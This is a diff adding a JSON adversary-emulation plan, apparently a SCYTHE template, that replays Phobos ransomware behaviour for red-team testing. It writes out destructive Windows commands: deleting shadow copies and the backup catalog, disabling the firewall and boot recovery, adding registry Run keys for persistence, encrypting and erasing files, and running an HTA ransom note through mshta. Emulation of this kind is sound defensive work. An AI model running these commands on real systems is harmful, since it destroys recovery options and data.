@@ -1,0 +1,295 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Based on CTI from: https://blogs.blackberry.com/en/2021/09/threat-thursday-phobos-ransomware",
+        "display_name": "Phobos",
+        "name": "Phobos",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"192.168.2.50:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":1}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "4": {
+                "function": "ifelse",
+                "next": "9",
+                "step": "3",
+                "type": "decision",
+                "value": "High",
+                "verb": "contains"
+            },
+            "5": {
+                "module": "loader",
+                "module_to_load": "elevate",
+                "request": "--load elevate",
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "bdcde5a2-dff1-4c59-860b-960f57a12296",
+                "module": "elevate",
+                "request": "--prompt",
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "8": {
+                "function": "ifelse",
+                "next": "20",
+                "step": "7",
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "9": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "DEFENSE EVASION"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "vssadmin delete shadows /all /quiet",
+                "rtags": [
+                    "att&ck-technique:T1490"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "netsh advfirewall set currentprofile state off",
+                "rtags": [
+                    "att&ck-technique:T1562.004"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "netsh firewall set opmode mode=disable",
+                "rtags": [
+                    "att&ck-technique:T1562"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "wmic shadowcopy delete",
+                "rtags": [
+                    "att&ck-technique:T1047"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "bcdedit  /set {default} bootstatuspolicy ignoreallfailures",
+                "rtags": [
+                    "att&ck-technique:T1490"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "bcdedit  /set {default} recoveryenabled no",
+                "rtags": [
+                    "att&ck-technique:T1490"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "wbadmin delete catalog -quiet",
+                "rtags": [
+                    "att&ck-technique:T1490"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "PERSISTENCE"
+            },
+            "18": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%AllUsersProfile%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\horsemoney.exe\" --size 1MB --count 1 --random",
+                "rtags": [
+                    "att&ck-technique:T1547"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Windows\\CurrentVersion\\Run\\horsemoney /v Example /d \"Phobos Data\" /f",
+                "rtags": [
+                    "att&ck-technique:T1547.001"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%LocalAppData%\\horsemoney.exe\" --size 1MB --count 1 --random",
+                "rtags": [
+                    "att&ck-technique:T1547"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\horsemoney.exe\" --size 1MB --count 1 --random",
+                "rtags": [
+                    "att&ck-technique:T1547"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG ADD HKEY_CURRENT_USER\\SOFTWARE\\WOW6432Node\\Windows\\CurrentVersion\\Run\\horsemoney /v Example /d \"Phobos Data\" /f",
+                "rtags": [
+                    "att&ck-technique:T1547.001"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "IMPACT"
+            },
+            "24": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c mkdir \"%USERPROFILE%\\Desktop\\Phobos\"",
+                "type": "message"
+            },
+            "25": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%USERPROFILE%\\Desktop\\Phobos\\target_file.xls\" --size 1MB --count 100 --random",
+                "rtags": [
+                    "att&ck-technique:T1074.001"
+                ],
+                "type": "message"
+            },
+            "26": {
+                "module": "loader",
+                "module_to_load": "crypt",
+                "request": "--load crypt",
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
+                "module": "crypt",
+                "request": "--target \"%USERPROFILE%\\Desktop\\Phobos\\\" --encrypt --password \"#RansomwareSucks\" --erase",
+                "rtags": [
+                    "att&ck-technique:T1485"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%USERPROFILE%\\Desktop\\Phobos\\encryptedfile.HORSEMONEY\" --size 1MB --count 1 --random",
+                "rtags": [
+                    "att&ck-technique:T1486"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "30": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/Phobos/info.hta\" --dest \"%USERPROFILE%\\Desktop\\Phobos\\info.hta\"",
+                "rtags": [
+                    "att&ck-technique:T1491.001"
+                ],
+                "type": "message"
+            },
+            "31": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "mshta.exe \"%USERPROFILE%\\Desktop\\Phobos\\info.hta\" &",
+                "rtags": [
+                    "att&ck-technique:T1218.005"
+                ],
+                "type": "message"
+            },
+            "32": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEANUP"
+            },
+            "33": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del \"%LocalAppData%\\horsemoney.exe\"",
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\horsemoney.exe\"",
+                "type": "message"
+            },
+            "35": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG DELETE HKEY_CURRENT_USER\\SOFTWARE\\WOW6432Node\\Windows\\CurrentVersion\\Run\\horsemoney /f",
+                "type": "message"
+            },
+            "36": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c rmdir /Q /S \"%USERPROFILE%\\Desktop\\Phobos\"",
+                "type": "message"
+            },
+            "37": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
